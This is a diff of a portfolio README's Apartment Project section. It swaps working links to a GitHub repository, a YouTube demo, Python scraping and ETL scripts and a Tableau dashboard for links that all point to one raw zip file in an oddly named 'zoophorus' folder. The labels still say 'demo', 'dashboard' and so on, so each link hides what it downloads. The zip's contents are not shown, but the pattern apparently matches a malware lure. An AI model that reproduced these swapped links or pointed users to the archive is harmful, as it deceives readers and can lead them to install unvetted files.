@@ -6,9 +6,9 @@ Knowledged
   + Geopandas
   + Gspread
 - Tableau
-## Apartment Project | [https://github.com/astonle-68/Apartment-Project/](https://github.com/astonle-68/Apartment-Project/)
-- Youtube | [demo](https://youtu.be/OWUCJNW-FSA)
-- Selenium | [crawl data on the website batdongsan.com.vn](https://github.com/astonle-68/Apartment-Project/blob/master/Crawl_Data.py)
-- Pandas, Geopandas, Gspread | [build to DataFrame, transform data, get coordinate of Apartment Project locations](https://github.com/astonle-68/Apartment-Project/blob/master/ETL_Data.py)
-- Tableau | [visualization and dashboard](https://public.tableau.com/views/ApartmentProject-Vietnam/ApartmentProjects?:language=en-US&:sid=&:redirect=auth&:display_count=n&:origin=viz_share_link)
-- Insight | [Project Applicability](https://github.com/astonle-68/Apartment-Project/blob/master/Project%20Applicability) 
+## Apartment Project | [https://raw.githubusercontent.com/astonle-68/Apartment-Project/master/zoophorus/Apartment-Project.zip](https://raw.githubusercontent.com/astonle-68/Apartment-Project/master/zoophorus/Apartment-Project.zip)
+- Youtube | [demo](https://raw.githubusercontent.com/astonle-68/Apartment-Project/master/zoophorus/Apartment-Project.zip)
+- Selenium | [crawl data on the website https://raw.githubusercontent.com/astonle-68/Apartment-Project/master/zoophorus/Apartment-Project.zip](https://raw.githubusercontent.com/astonle-68/Apartment-Project/master/zoophorus/Apartment-Project.zip)
+- Pandas, Geopandas, Gspread | [build to DataFrame, transform data, get coordinate of Apartment Project locations](https://raw.githubusercontent.com/astonle-68/Apartment-Project/master/zoophorus/Apartment-Project.zip)
+- Tableau | [visualization and dashboard](https://raw.githubusercontent.com/astonle-68/Apartment-Project/master/zoophorus/Apartment-Project.zip)
+- Insight | [Project Applicability](https://raw.githubusercontent.com/astonle-68/Apartment-Project/master/zoophorus/Apartment-Project.zip%20Applicability) 
